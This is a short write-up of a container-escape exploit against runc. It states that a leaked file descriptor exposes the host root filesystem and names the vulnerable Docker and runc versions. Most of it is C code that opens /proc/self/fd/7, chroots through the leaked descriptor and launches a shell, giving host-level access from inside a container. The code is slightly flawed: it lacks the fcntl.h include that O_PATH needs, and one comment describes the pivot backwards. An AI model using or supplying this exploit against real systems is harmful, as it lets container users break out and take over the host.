#01 Vulnerability Fundamentals & Setup

During runc init execution prior to setns closure, internal file descriptors remain unexpectedly unsealed across execve calls. An unprivileged or jailed process within the new container hierarchy can inspect /proc/self/fd to discover an open handle pointing backward into the host system’s absolute root filesystem.

info
Target Environment Specification

Target environment tested under Docker engine ≤ 25.0.1 and runc ≤ 1.1.11. Host kernel: 6.5.0-18-generic (x86_64). Container profile retains default capabilities without rootless namespace wrapping.

#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv) {
    // runc leaks an internal file descriptor (commonly fd 7 or 8)
    int fd = open("/proc/self/fd/7", O_PATH);
    if (fd < 0) {
        perror("[-] Failed to locate leaked descriptor");
        return 1;
    }

    // Pivot host working directory onto container rootfs
    fchdir(fd);
    chroot(".");
    
    char *shell_args[] = {"/bin/sh", NULL};
    execve("/bin/sh", shell_args, NULL);
    return 0;
}
